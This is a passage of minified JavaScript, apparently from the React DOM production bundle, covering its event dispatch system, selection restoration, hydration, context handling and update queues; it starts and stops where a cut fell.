function em(e, t) {
    if (e === "click") return sa(t)
}

function tm(e, t) {
    if (e === "input" || e === "change") return sa(t)
}

function nm(e, t) {
    return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
var lt = typeof Object.is == "function" ? Object.is : nm;

function _r(e, t) {
    if (lt(e, t)) return !0;
    if (typeof e != "object" || e === null || typeof t != "object" || t === null) return !1;
    var n = Object.keys(e),
        r = Object.keys(t);
    if (n.length !== r.length) return !1;
    for (r = 0; r < n.length; r++) {
        var l = n[r];
        if (!oo.call(t, l) || !lt(e[l], t[l])) return !1
    }
    return !0
}

function Ws(e) {
    for (; e && e.firstChild;) e = e.firstChild;
    return e
}

function Us(e, t) {
    var n = Ws(e);
    e = 0;
    for (var r; n;) {
        if (n.nodeType === 3) {
            if (r = e + n.textContent.length, e <= t && r >= t) return {
                node: n,
                offset: t - e
            };
            e = r
        }
        e: {
            for (; n;) {
                if (n.nextSibling) {
                    n = n.nextSibling;
                    break e
                }
                n = n.parentNode
            }
            n = void 0
        }
        n = Ws(n)
    }
}

function Rc(e, t) {
    return e && t ? e === t ? !0 : e && e.nodeType === 3 ? !1 : t && t.nodeType === 3 ? Rc(e, t.parentNode) : "contains" in e ? e.contains(t) : e.compareDocumentPosition ? !!(e.compareDocumentPosition(t) & 16) : !1 : !1
}

function Fc() {
    for (var e = window, t = Rl(); t instanceof e.HTMLIFrameElement;) {
        try {
            var n = typeof t.contentWindow.location.href == "string"
        } catch {
            n = !1
        }
        if (n) e = t.contentWindow;
        else break;
        t = Rl(e.document)
    }
    return t
}

function Ni(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t && (t === "input" && (e.type === "text" || e.type === "search" || e.type === "tel" || e.type === "url" || e.type === "password") || t === "textarea" || e.contentEditable === "true")
}

function rm(e) {
    var t = Fc(),
        n = e.focusedElem,
        r = e.selectionRange;
    if (t !== n && n && n.ownerDocument && Rc(n.ownerDocument.documentElement, n)) {
        if (r !== null && Ni(n)) {
            if (t = r.start, e = r.end, e === void 0 && (e = t), "selectionStart" in n) n.selectionStart = t, n.selectionEnd = Math.min(e, n.value.length);
            else if (e = (t = n.ownerDocument || document) && t.defaultView || window, e.getSelection) {
                e = e.getSelection();
                var l = n.textContent.length,
                    a = Math.min(r.start, l);
                r = r.end === void 0 ? a : Math.min(r.end, l), !e.extend && a > r && (l = r, r = a, a = l), l = Us(n, a);
                var o = Us(n, r);
                l && o && (e.rangeCount !== 1 || e.anchorNode !== l.node || e.anchorOffset !== l.offset || e.focusNode !== o.node || e.focusOffset !== o.offset) && (t = t.createRange(), t.setStart(l.node, l.offset), e.removeAllRanges(), a > r ? (e.addRange(t), e.extend(o.node, o.offset)) : (t.setEnd(o.node, o.offset), e.addRange(t)))
            }
        }
        for (t = [], e = n; e = e.parentNode;) e.nodeType === 1 && t.push({
            element: e,
            left: e.scrollLeft,
            top: e.scrollTop
        });
        for (typeof n.focus == "function" && n.focus(), n = 0; n < t.length; n++) e = t[n], e.element.scrollLeft = e.left, e.element.scrollTop = e.top
    }
}
var lm = xt && "documentMode" in document && 11 >= document.documentMode,
    kn = null,
    Co = null,
    wr = null,
    Po = !1;

function Bs(e, t, n) {
    var r = n.window === n ? n.document : n.nodeType === 9 ? n : n.ownerDocument;
    Po || kn == null || kn !== Rl(r) || (r = kn, "selectionStart" in r && Ni(r) ? r = {
        start: r.selectionStart,
        end: r.selectionEnd
    } : (r = (r.ownerDocument && r.ownerDocument.defaultView || window).getSelection(), r = {
        anchorNode: r.anchorNode,
        anchorOffset: r.anchorOffset,
        focusNode: r.focusNode,
        focusOffset: r.focusOffset
    }), wr && _r(wr, r) || (wr = r, r = Al(Co, "onSelect"), 0 < r.length && (t = new bi("onSelect", "select", null, t, n), e.push({
        event: t,
        listeners: r
    }), t.target = kn)))
}

function ul(e, t) {
    var n = {};
    return n[e.toLowerCase()] = t.toLowerCase(), n["Webkit" + e] = "webkit" + t, n["Moz" + e] = "moz" + t, n
}
var bn = {
        animationend: ul("Animation", "AnimationEnd"),
        animationiteration: ul("Animation", "AnimationIteration"),
        animationstart: ul("Animation", "AnimationStart"),
        transitionend: ul("Transition", "TransitionEnd")
    },
    Da = {},
    Ic = {};
xt && (Ic = document.createElement("div").style, "AnimationEvent" in window || (delete bn.animationend.animation, delete bn.animationiteration.animation, delete bn.animationstart.animation), "TransitionEvent" in window || delete bn.transitionend.transition);

function ua(e) {
    if (Da[e]) return Da[e];
    if (!bn[e]) return e;
    var t = bn[e],
        n;
    for (n in t)
        if (t.hasOwnProperty(n) && n in Ic) return Da[e] = t[n];
    return e
}
var Dc = ua("animationend"),
    Mc = ua("animationiteration"),
    Oc = ua("animationstart"),
    zc = ua("transitionend"),
    Ac = new Map,
    Hs = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");

function Kt(e, t) {
    Ac.set(e, t), mn(t, [e])
}
for (var Ma = 0; Ma < Hs.length; Ma++) {
    var Oa = Hs[Ma],
        am = Oa.toLowerCase(),
        om = Oa[0].toUpperCase() + Oa.slice(1);
    Kt(am, "on" + om)
}
Kt(Dc, "onAnimationEnd");
Kt(Mc, "onAnimationIteration");
Kt(Oc, "onAnimationStart");
Kt("dblclick", "onDoubleClick");
Kt("focusin", "onFocus");
Kt("focusout", "onBlur");
Kt(zc, "onTransitionEnd");
On("onMouseEnter", ["mouseout", "mouseover"]);
On("onMouseLeave", ["mouseout", "mouseover"]);
On("onPointerEnter", ["pointerout", "pointerover"]);
On("onPointerLeave", ["pointerout", "pointerover"]);
mn("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" "));
mn("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));
mn("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]);
mn("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" "));
mn("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" "));
mn("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
var pr = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),
    im = new Set("cancel close invalid load scroll toggle".split(" ").concat(pr));

function Vs(e, t, n) {
    var r = e.type || "unknown-event";
    e.currentTarget = n, ap(r, t, void 0, e), e.currentTarget = null
}

function Wc(e, t) {
    t = (t & 4) !== 0;
    for (var n = 0; n < e.length; n++) {
        var r = e[n],
            l = r.event;
        r = r.listeners;
        e: {
            var a = void 0;
            if (t)
                for (var o = r.length - 1; 0 <= o; o--) {
                    var i = r[o],
                        s = i.instance,
                        u = i.currentTarget;
                    if (i = i.listener, s !== a && l.isPropagationStopped()) break e;
                    Vs(l, i, u), a = s
                } else
                    for (o = 0; o < r.length; o++) {
                        if (i = r[o], s = i.instance, u = i.currentTarget, i = i.listener, s !== a && l.isPropagationStopped()) break e;
                        Vs(l, i, u), a = s
                    }
        }
    }
    if (Il) throw e = bo, Il = !1, bo = null, e
}

function V(e, t) {
    var n = t[_o];
    n === void 0 && (n = t[_o] = new Set);
    var r = e + "__bubble";
    n.has(r) || (Uc(t, e, 2, !1), n.add(r))
}

function za(e, t, n) {
    var r = 0;
    t && (r |= 4), Uc(n, e, r, t)
}
var cl = "_reactListening" + Math.random().toString(36).slice(2);

function Rr(e) {
    if (!e[cl]) {
        e[cl] = !0, Gu.forEach(function(n) {
            n !== "selectionchange" && (im.has(n) || za(n, !1, e), za(n, !0, e))
        });
        var t = e.nodeType === 9 ? e : e.ownerDocument;
        t === null || t[cl] || (t[cl] = !0, za("selectionchange", !1, t))
    }
}

function Uc(e, t, n, r) {
    switch (Nc(t)) {
        case 1:
            var l = kp;
            break;
        case 4:
            l = bp;
            break;
        default:
            l = xi
    }
    n = l.bind(null, t, n, e), l = void 0, !ko || t !== "touchstart" && t !== "touchmove" && t !== "wheel" || (l = !0), r ? l !== void 0 ? e.addEventListener(t, n, {
        capture: !0,
        passive: l
    }) : e.addEventListener(t, n, !0) : l !== void 0 ? e.addEventListener(t, n, {
        passive: l
    }) : e.addEventListener(t, n, !1)
}

function Aa(e, t, n, r, l) {
    var a = r;
    if (!(t & 1) && !(t & 2) && r !== null) e: for (;;) {
        if (r === null) return;
        var o = r.tag;
        if (o === 3 || o === 4) {
            var i = r.stateNode.containerInfo;
            if (i === l || i.nodeType === 8 && i.parentNode === l) break;
            if (o === 4)
                for (o = r.return; o !== null;) {
                    var s = o.tag;
                    if ((s === 3 || s === 4) && (s = o.stateNode.containerInfo, s === l || s.nodeType === 8 && s.parentNode === l)) return;
                    o = o.return
                }
            for (; i !== null;) {
                if (o = tn(i), o === null) return;
                if (s = o.tag, s === 5 || s === 6) {
                    r = a = o;
                    continue e
                }
                i = i.parentNode
            }
        }
        r = r.return
    }
    dc(function() {
        var u = a,
            d = vi(n),
            h = [];
        e: {
            var v = Ac.get(e);
            if (v !== void 0) {
                var y = bi,
                    w = e;
                switch (e) {
                    case "keypress":
                        if (El(n) === 0) break e;
                    case "keydown":
                    case "keyup":
                        y = Mp;
                        break;
                    case "focusin":
                        w = "focus", y = Ra;
                        break;
                    case "focusout":
                        w = "blur", y = Ra;
                        break;
                    case "beforeblur":
                    case "afterblur":
                        y = Ra;
                        break;
                    case "click":
                        if (n.button === 2) break e;
                    case "auxclick":
                    case "dblclick":
                    case "mousedown":
                    case "mousemove":
                    case "mouseup":
                    case "mouseout":
                    case "mouseover":
                    case "contextmenu":
                        y = Rs;
                        break;
                    case "drag":
                    case "dragend":
                    case "dragenter":
                    case "dragexit":
                    case "dragleave":
                    case "dragover":
                    case "dragstart":
                    case "drop":
                        y = Np;
                        break;
                    case "touchcancel":
                    case "touchend":
                    case "touchmove":
                    case "touchstart":
                        y = Ap;
                        break;
                    case Dc:
                    case Mc:
                    case Oc:
                        y = Tp;
                        break;
                    case zc:
                        y = Up;
                        break;
                    case "scroll":
                        y = Sp;
                        break;
                    case "wheel":
                        y = Hp;
                        break;
                    case "copy":
                    case "cut":
                    case "paste":
                        y = Lp;
                        break;
                    case "gotpointercapture":
                    case "lostpointercapture":
                    case "pointercancel":
                    case "pointerdown":
                    case "pointermove":
                    case "pointerout":
                    case "pointerover":
                    case "pointerup":
                        y = Is
                }
                var x = (t & 4) !== 0,
                    b = !x && e === "scroll",
                    f = x ? v !== null ? v + "Capture" : null : v;
                x = [];
                for (var c = u, m; c !== null;) {
                    m = c;
                    var k = m.stateNode;
                    if (m.tag === 5 && k !== null && (m = k, f !== null && (k = Pr(c, f), k != null && x.push(Fr(c, k, m)))), b) break;
                    c = c.return
                }
                0 < x.length && (v = new y(v, w, null, n, d), h.push({
                    event: v,
                    listeners: x
                }))
            }
        }
        if (!(t & 7)) {
            e: {
                if (v = e === "mouseover" || e === "pointerover", y = e === "mouseout" || e === "pointerout", v && n !== wo && (w = n.relatedTarget || n.fromElement) && (tn(w) || w[kt])) break e;
                if ((y || v) && (v = d.window === d ? d : (v = d.ownerDocument) ? v.defaultView || v.parentWindow : window, y ? (w = n.relatedTarget || n.toElement, y = u, w = w ? tn(w) : null, w !== null && (b = hn(w), w !== b || w.tag !== 5 && w.tag !== 6) && (w = null)) : (y = null, w = u), y !== w)) {
                    if (x = Rs, k = "onMouseLeave", f = "onMouseEnter", c = "mouse", (e === "pointerout" || e === "pointerover") && (x = Is, k = "onPointerLeave", f = "onPointerEnter", c = "pointer"), b = y == null ? v : Sn(y), m = w == null ? v : Sn(w), v = new x(k, c + "leave", y, n, d), v.target = b, v.relatedTarget = m, k = null, tn(d) === u && (x = new x(f, c + "enter", w, n, d), x.target = m, x.relatedTarget = b, k = x), b = k, y && w) t: {
                        for (x = y, f = w, c = 0, m = x; m; m = gn(m)) c++;
                        for (m = 0, k = f; k; k = gn(k)) m++;
                        for (; 0 < c - m;) x = gn(x),
                        c--;
                        for (; 0 < m - c;) f = gn(f),
                        m--;
                        for (; c--;) {
                            if (x === f || f !== null && x === f.alternate) break t;
                            x = gn(x), f = gn(f)
                        }
                        x = null
                    }
                    else x = null;
                    y !== null && Qs(h, v, y, x, !1), w !== null && b !== null && Qs(h, b, w, x, !0)
                }
            }
            e: {
                if (v = u ? Sn(u) : window, y = v.nodeName && v.nodeName.toLowerCase(), y === "select" || y === "input" && v.type === "file") var S = Zp;
                else if (Os(v))
                    if ($c) S = tm;
                    else {
                        S = qp;
                        var N = Jp
                    }
                else(y = v.nodeName) && y.toLowerCase() === "input" && (v.type === "checkbox" || v.type === "radio") && (S = em);
                if (S && (S = S(e, u))) {
                    Lc(h, S, n, d);
                    break e
                }
                N && N(e, v, u),
                e === "focusout" && (N = v._wrapperState) && N.controlled && v.type === "number" && mo(v, "number", v.value)
            }
            switch (N = u ? Sn(u) : window, e) {
                case "focusin":
                    (Os(N) || N.contentEditable === "true") && (kn = N, Co = u, wr = null);
                    break;
                case "focusout":
                    wr = Co = kn = null;
                    break;
                case "mousedown":
                    Po = !0;
                    break;
                case "contextmenu":
                case "mouseup":
                case "dragend":
                    Po = !1, Bs(h, n, d);
                    break;
                case "selectionchange":
                    if (lm) break;
                case "keydown":
                case "keyup":
                    Bs(h, n, d)
            }
            var P;
            if (Ei) e: {
                switch (e) {
                    case "compositionstart":
                        var C = "onCompositionStart";
                        break e;
                    case "compositionend":
                        C = "onCompositionEnd";
                        break e;
                    case "compositionupdate":
                        C = "onCompositionUpdate";
                        break e
                }
                C = void 0
            }
            else xn ? Tc(e, n) && (C = "onCompositionEnd") : e === "keydown" && n.keyCode === 229 && (C = "onCompositionStart");C && (Pc && n.locale !== "ko" && (xn || C !== "onCompositionStart" ? C === "onCompositionEnd" && xn && (P = Cc()) : (Rt = d, ki = "value" in Rt ? Rt.value : Rt.textContent, xn = !0)), N = Al(u, C), 0 < N.length && (C = new Fs(C, e, null, n, d), h.push({
                event: C,
                listeners: N
            }), P ? C.data = P : (P = jc(n), P !== null && (C.data = P)))),
            (P = Qp ? Kp(e, n) : Yp(e, n)) && (u = Al(u, "onBeforeInput"), 0 < u.length && (d = new Fs("onBeforeInput", "beforeinput", null, n, d), h.push({
                event: d,
                listeners: u
            }), d.data = P))
        }
        Wc(h, t)
    })
}

function Fr(e, t, n) {
    return {
        instance: e,
        listener: t,
        currentTarget: n
    }
}

function Al(e, t) {
    for (var n = t + "Capture", r = []; e !== null;) {
        var l = e,
            a = l.stateNode;
        l.tag === 5 && a !== null && (l = a, a = Pr(e, n), a != null && r.unshift(Fr(e, a, l)), a = Pr(e, t), a != null && r.push(Fr(e, a, l))), e = e.return
    }
    return r
}

function gn(e) {
    if (e === null) return null;
    do e = e.return; while (e && e.tag !== 5);
    return e || null
}

function Qs(e, t, n, r, l) {
    for (var a = t._reactName, o = []; n !== null && n !== r;) {
        var i = n,
            s = i.alternate,
            u = i.stateNode;
        if (s !== null && s === r) break;
        i.tag === 5 && u !== null && (i = u, l ? (s = Pr(n, a), s != null && o.unshift(Fr(n, s, i))) : l || (s = Pr(n, a), s != null && o.push(Fr(n, s, i)))), n = n.return
    }
    o.length !== 0 && e.push({
        event: t,
        listeners: o
    })
}
var sm = /\r\n?/g,
    um = /\u0000|\uFFFD/g;

function Ks(e) {
    return (typeof e == "string" ? e : "" + e).replace(sm, `
`).replace(um, "")
}

function dl(e, t, n) {
    if (t = Ks(t), Ks(e) !== t && n) throw Error(E(425))
}

function Wl() {}
var To = null,
    jo = null;

function Lo(e, t) {
    return e === "textarea" || e === "noscript" || typeof t.children == "string" || typeof t.children == "number" || typeof t.dangerouslySetInnerHTML == "object" && t.dangerouslySetInnerHTML !== null && t.dangerouslySetInnerHTML.__html != null
}
var $o = typeof setTimeout == "function" ? setTimeout : void 0,
    cm = typeof clearTimeout == "function" ? clearTimeout : void 0,
    Ys = typeof Promise == "function" ? Promise : void 0,
    dm = typeof queueMicrotask == "function" ? queueMicrotask : typeof Ys < "u" ? function(e) {
        return Ys.resolve(null).then(e).catch(fm)
    } : $o;

function fm(e) {
    setTimeout(function() {
        throw e
    })
}

function Wa(e, t) {
    var n = t,
        r = 0;
    do {
        var l = n.nextSibling;
        if (e.removeChild(n), l && l.nodeType === 8)
            if (n = l.data, n === "/$") {
                if (r === 0) {
                    e.removeChild(l), Lr(t);
                    return
                }
                r--
            } else n !== "$" && n !== "$?" && n !== "$!" || r++;
        n = l
    } while (n);
    Lr(t)
}

function zt(e) {
    for (; e != null; e = e.nextSibling) {
        var t = e.nodeType;
        if (t === 1 || t === 3) break;
        if (t === 8) {
            if (t = e.data, t === "$" || t === "$!" || t === "$?") break;
            if (t === "/$") return null
        }
    }
    return e
}

function Gs(e) {
    e = e.previousSibling;
    for (var t = 0; e;) {
        if (e.nodeType === 8) {
            var n = e.data;
            if (n === "$" || n === "$!" || n === "$?") {
                if (t === 0) return e;
                t--
            } else n === "/$" && t++
        }
        e = e.previousSibling
    }
    return null
}
var Yn = Math.random().toString(36).slice(2),
    st = "__reactFiber$" + Yn,
    Ir = "__reactProps$" + Yn,
    kt = "__reactContainer$" + Yn,
    _o = "__reactEvents$" + Yn,
    pm = "__reactListeners$" + Yn,
    mm = "__reactHandles$" + Yn;

function tn(e) {
    var t = e[st];
    if (t) return t;
    for (var n = e.parentNode; n;) {
        if (t = n[kt] || n[st]) {
            if (n = t.alternate, t.child !== null || n !== null && n.child !== null)
                for (e = Gs(e); e !== null;) {
                    if (n = e[st]) return n;
                    e = Gs(e)
                }
            return t
        }
        e = n, n = e.parentNode
    }
    return null
}

function Kr(e) {
    return e = e[st] || e[kt], !e || e.tag !== 5 && e.tag !== 6 && e.tag !== 13 && e.tag !== 3 ? null : e
}

function Sn(e) {
    if (e.tag === 5 || e.tag === 6) return e.stateNode;
    throw Error(E(33))
}

function ca(e) {
    return e[Ir] || null
}
var Ro = [],
    En = -1;

function Yt(e) {
    return {
        current: e
    }
}

function Q(e) {
    0 > En || (e.current = Ro[En], Ro[En] = null, En--)
}

function B(e, t) {
    En++, Ro[En] = e.current, e.current = t
}
var Qt = {},
    xe = Yt(Qt),
    Pe = Yt(!1),
    un = Qt;

function zn(e, t) {
    var n = e.type.contextTypes;
    if (!n) return Qt;
    var r = e.stateNode;
    if (r && r.__reactInternalMemoizedUnmaskedChildContext === t) return r.__reactInternalMemoizedMaskedChildContext;
    var l = {},
        a;
    for (a in n) l[a] = t[a];
    return r && (e = e.stateNode, e.__reactInternalMemoizedUnmaskedChildContext = t, e.__reactInternalMemoizedMaskedChildContext = l), l
}

function Te(e) {
    return e = e.childContextTypes, e != null
}

function Ul() {
    Q(Pe), Q(xe)
}

function Xs(e, t, n) {
    if (xe.current !== Qt) throw Error(E(168));
    B(xe, t), B(Pe, n)
}

function Bc(e, t, n) {
    var r = e.stateNode;
    if (t = t.childContextTypes, typeof r.getChildContext != "function") return n;
    r = r.getChildContext();
    for (var l in r)
        if (!(l in t)) throw Error(E(108, Jf(e) || "Unknown", l));
    return J({}, n, r)
}

function Bl(e) {
    return e = (e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext || Qt, un = xe.current, B(xe, e), B(Pe, Pe.current), !0
}

function Zs(e, t, n) {
    var r = e.stateNode;
    if (!r) throw Error(E(169));
    n ? (e = Bc(e, t, un), r.__reactInternalMemoizedMergedChildContext = e, Q(Pe), Q(xe), B(xe, e)) : Q(Pe), B(Pe, n)
}
var ht = null,
    da = !1,
    Ua = !1;

function Hc(e) {
    ht === null ? ht = [e] : ht.push(e)
}

function hm(e) {
    da = !0, Hc(e)
}

function Gt() {
    if (!Ua && ht !== null) {
        Ua = !0;
        var e = 0,
            t = z;
        try {
            var n = ht;
            for (z = 1; e < n.length; e++) {
                var r = n[e];
                do r = r(!0); while (r !== null)
            }
            ht = null, da = !1
        } catch (l) {
            throw ht !== null && (ht = ht.slice(e + 1)), hc(gi, Gt), l
        } finally {
            z = t, Ua = !1
        }
    }
    return null
}
var Nn = [],
    Cn = 0,
    Hl = null,
    Vl = 0,
    Ae = [],
    We = 0,
    cn = null,
    vt = 1,
    gt = "";

function qt(e, t) {
    Nn[Cn++] = Vl, Nn[Cn++] = Hl, Hl = e, Vl = t
}

function Vc(e, t, n) {
    Ae[We++] = vt, Ae[We++] = gt, Ae[We++] = cn, cn = e;
    var r = vt;
    e = gt;
    var l = 32 - nt(r) - 1;
    r &= ~(1 << l), n += 1;
    var a = 32 - nt(t) + l;
    if (30 < a) {
        var o = l - l % 5;
        a = (r & (1 << o) - 1).toString(32), r >>= o, l -= o, vt = 1 << 32 - nt(t) + l | n << l | r, gt = a + e
    } else vt = 1 << a | n << l | r, gt = e
}

function Ci(e) {
    e.return !== null && (qt(e, 1), Vc(e, 1, 0))
}

function Pi(e) {
    for (; e === Hl;) Hl = Nn[--Cn], Nn[Cn] = null, Vl = Nn[--Cn], Nn[Cn] = null;
    for (; e === cn;) cn = Ae[--We], Ae[We] = null, gt = Ae[--We], Ae[We] = null, vt = Ae[--We], Ae[We] = null
}
var Re = null,
    _e = null,
    Y = !1,
    qe = null;

function Qc(e, t) {
    var n = Ue(5, null, null, 0);
    n.elementType = "DELETED", n.stateNode = t, n.return = e, t = e.deletions, t === null ? (e.deletions = [n], e.flags |= 16) : t.push(n)
}

function Js(e, t) {
    switch (e.tag) {
        case 5:
            var n = e.type;
            return t = t.nodeType !== 1 || n.toLowerCase() !== t.nodeName.toLowerCase() ? null : t, t !== null ? (e.stateNode = t, Re = e, _e = zt(t.firstChild), !0) : !1;
        case 6:
            return t = e.pendingProps === "" || t.nodeType !== 3 ? null : t, t !== null ? (e.stateNode = t, Re = e, _e = null, !0) : !1;
        case 13:
            return t = t.nodeType !== 8 ? null : t, t !== null ? (n = cn !== null ? {
                id: vt,
                overflow: gt
            } : null, e.memoizedState = {
                dehydrated: t,
                treeContext: n,
                retryLane: 1073741824
            }, n = Ue(18, null, null, 0), n.stateNode = t, n.return = e, e.child = n, Re = e, _e = null, !0) : !1;
        default:
            return !1
    }
}

function Fo(e) {
    return (e.mode & 1) !== 0 && (e.flags & 128) === 0
}

function Io(e) {
    if (Y) {
        var t = _e;
        if (t) {
            var n = t;
            if (!Js(e, t)) {
                if (Fo(e)) throw Error(E(418));
                t = zt(n.nextSibling);
                var r = Re;
                t && Js(e, t) ? Qc(r, n) : (e.flags = e.flags & -4097 | 2, Y = !1, Re = e)
            }
        } else {
            if (Fo(e)) throw Error(E(418));
            e.flags = e.flags & -4097 | 2, Y = !1, Re = e
        }
    }
}

function qs(e) {
    for (e = e.return; e !== null && e.tag !== 5 && e.tag !== 3 && e.tag !== 13;) e = e.return;
    Re = e
}

function fl(e) {
    if (e !== Re) return !1;
    if (!Y) return qs(e), Y = !0, !1;
    var t;
    if ((t = e.tag !== 3) && !(t = e.tag !== 5) && (t = e.type, t = t !== "head" && t !== "body" && !Lo(e.type, e.memoizedProps)), t && (t = _e)) {
        if (Fo(e)) throw Kc(), Error(E(418));
        for (; t;) Qc(e, t), t = zt(t.nextSibling)
    }
    if (qs(e), e.tag === 13) {
        if (e = e.memoizedState, e = e !== null ? e.dehydrated : null, !e) throw Error(E(317));
        e: {
            for (e = e.nextSibling, t = 0; e;) {
                if (e.nodeType === 8) {
                    var n = e.data;
                    if (n === "/$") {
                        if (t === 0) {
                            _e = zt(e.nextSibling);
                            break e
                        }
                        t--
                    } else n !== "$" && n !== "$!" && n !== "$?" || t++
                }
                e = e.nextSibling
            }
            _e = null
        }
    } else _e = Re ? zt(e.stateNode.nextSibling) : null;
    return !0
}

function Kc() {
    for (var e = _e; e;) e = zt(e.nextSibling)
}

function An() {
    _e = Re = null, Y = !1
}

function Ti(e) {
    qe === null ? qe = [e] : qe.push(e)
}
var vm = Et.ReactCurrentBatchConfig;

function Ze(e, t) {
    if (e && e.defaultProps) {
        t = J({}, t), e = e.defaultProps;
        for (var n in e) t[n] === void 0 && (t[n] = e[n]);
        return t
    }
    return t
}
var Ql = Yt(null),
    Kl = null,
    Pn = null,
    ji = null;

function Li() {
    ji = Pn = Kl = null
}

function $i(e) {
    var t = Ql.current;
    Q(Ql), e._currentValue = t
}

function Do(e, t, n) {
    for (; e !== null;) {
        var r = e.alternate;
        if ((e.childLanes & t) !== t ? (e.childLanes |= t, r !== null && (r.childLanes |= t)) : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t), e === n) break;
        e = e.return
    }
}

function In(e, t) {
    Kl = e, ji = Pn = null, e = e.dependencies, e !== null && e.firstContext !== null && (e.lanes & t && (Ce = !0), e.firstContext = null)
}

function Ve(e) {
    var t = e._currentValue;
    if (ji !== e)
        if (e = {
                context: e,
                memoizedValue: t,
                next: null
            }, Pn === null) {
            if (Kl === null) throw Error(E(308));
            Pn = e, Kl.dependencies = {
                lanes: 0,
                firstContext: e
            }
        } else Pn = Pn.next = e;
    return t
}
var nn = null;

function _i(e) {
    nn === null ? nn = [e] : nn.push(e)
}

function Yc(e, t, n, r) {
    var l = t.interleaved;
    return l === null ? (n.next = n, _i(t)) : (n.next = l.next, l.next = n), t.interleaved = n, bt(e, r)
}

function bt(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (n !== null && (n.lanes |= t), n = e, e = e.return; e !== null;) e.childLanes |= t, n = e.alternate, n !== null && (n.childLanes |= t), n = e, e = e.return;
    return n.tag === 3 ? n.stateNode : null
}
var Tt = !1;

function Ri(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: {
            pending: null,
            interleaved: null,
            lanes: 0
        },
        effects: null
    }
}

function Gc(e, t) {
    e = e.updateQueue, t.updateQueue === e && (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects
    })
}

function yt(e, t) {
    return {
        eventTime: e,
        lane: t,
        tag: 0,
        payload: null,
        callback: null,
        next: null
    }
}

function At(e, t, n) {
    var r = e.updateQueue;
    if (r === null) return null;
    if (r = r.shared, O & 2) {
        var l = r.pending;
        return l === null ? t.next = t : (t.next = l.next, l.next = t), r.pending = t, bt(e, n)
    }
    return l = r.interleaved, l === null ? (t.next = t, _i(r)) : (t.next = l.next, l.next = t), r.interleaved = t, bt(e, n)
}

function Nl(e, t, n) {
    if (t = t.updateQueue, t !== null && (t = t.shared, (n & 4194240) !== 0)) {
        var r = t.lanes;
        r &= e.pendingLanes, n |= r, t.lanes = n, yi(e, n)
    }
}

function eu(e, t) {
    var n = e.updateQueue,
        r = e.alternate;
    if (r !== null && (r = r.updateQueue, n === r)) {
        var l = null,
            a = null;
        if (n = n.firstBaseUpdate, n !== null) {
            do {
                var o = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null
                };
                a === null ? l = a = o : a = a.next = o, n = n.next
            } while (n !== null);
            a === null ? l = a = t : a = a.next = t
        } else l = a = t;
        n = {
            baseState: r.baseState,
            firstBaseUpdate: l,
            lastBaseUpdate: a,
            shared: r.shared,
            effects: r.effects
        }, e.updateQueue = n;
        return
    }
    e = n.lastBaseUpdate, e === null ? n.firstBaseUpdate = t : e.next = t, n.lastBaseUpdate = t
}

function Yl(e, t, n, r) {
    var l = e.updateQueue;
    Tt = !1;
    var a = l.firstBaseUpdate,
        o = l.lastBaseUpdate,
        i = l.shared.pending;
    if (i !== null) {
        l.shared.pending = null;
        var s = i,
            u = s.next;
        s.next = null, o === null ? a = u : o.next = u, o = s;
        var d = e.alternate;
        d !== null && (d = d.updateQueue, i = d.lastBaseUpdate, i !== o && (i === null ? d.firstBaseUpdate = u : i.next = u, d.lastBaseUpdate = s))
    }
    if (a !== null) {
        var h = l.baseState;
        o = 0, d = u = s = null, i = a;
        do {
            var v = i.lane,
                y = i.eventTime;
            if ((r & v) === v) {
                d !== null && (d = d.next = {
                    eventTime: y,
                    lane: 0,
                    tag: i.tag,
                    payload: i.payload,
                    callback: i.callback,
                    next: null
                });
                e: {
                    var w = e,
                        x = i;
                    switch (v = t, y = n, x.tag) {
                        case 1:
                            if (w = x.payload, typeof w == "function") {
                                h = w.call(y, h, v);
                                break e
                            }
                            h = w;
                            break e;
                        case 3:
                            w.flags = w.flags & -65537 | 128;
                        case 0:
                            if (w = x.payload, v = typeof w == "function" ? w.call(y, h, v) : w, v == null) break e;
                            h = J({}, h, v);
                            break e;
                        case 2:
                            Tt = !0
                    }
                }
                i.callback !== null && i.lane !== 0 && (e.flags |= 64, v = l.effects, v === null ? l.effects = [i] : v.push(i))
            } else y = {
                eventTime: y,
                lane: v,
                tag: i.tag,
                payload: i.payload,
                callback: i.callback,
                next: null
            }, d === null ? (u = d = y, s = h) : d = d.next = y, o |= v;
            if (i = i.next, i === null) {
                if (i = l.shared.pending, i === null) break;
                v = i, i = v.next, v.next = null, l.lastBaseUpdate = v, l.shared.pending = null
            }
        } while (!0);
        if (d === null && (s = h), l.baseState = s, l.firstBaseUpdate = u, l.lastBaseUpdate = d, t = l.shared.interleaved, t !== null) {
            l = t;
            do o |= l.lane, l = l.next; while (l !== t)
        } else a === null && (l.shared.lanes = 0);
        fn |= o, e.lanes = o, e.memoizedState = h
    }
}

function tu(e, t, n) {
    if (e = t.effects, t.effects = null, e !== null)
        for (t = 0; t < e.length; t++) {
